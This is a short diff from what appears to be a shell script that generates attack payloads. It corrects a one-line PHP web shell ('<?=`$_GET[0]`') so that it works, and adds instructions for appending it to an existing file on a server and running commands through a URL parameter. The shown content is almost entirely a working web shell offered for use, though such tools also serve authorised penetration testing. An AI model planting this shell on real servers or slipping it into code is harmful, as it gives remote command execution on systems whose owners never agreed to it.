@@ -227,7 +227,7 @@ then
 	echo -e "\n{Generic Web Shell Payload}\n\n"
 	echo -e "[!] Tip: This is the smallest possible payload, & it should work on any PHP server.\n\nIf you're adding the payload to an existing file, append the PHP closing tags ?>\n\nNavigate to the file's URL to execute commands (e.g. https://example.com/shell.php?0=whoami)\n\nTiny Payload:\n"
 
-	echo '<=`$_GET[0]`'
+	echo '<?=`$_GET[0]`'
 
 	echo -e "$line\n{Linux Payloads}\n\n"
 	echo -e "[!] Tip: You can use PHP to execute other payloads by placing them inside the exec() or system() functions (e.g. for a Windows Target).\n"
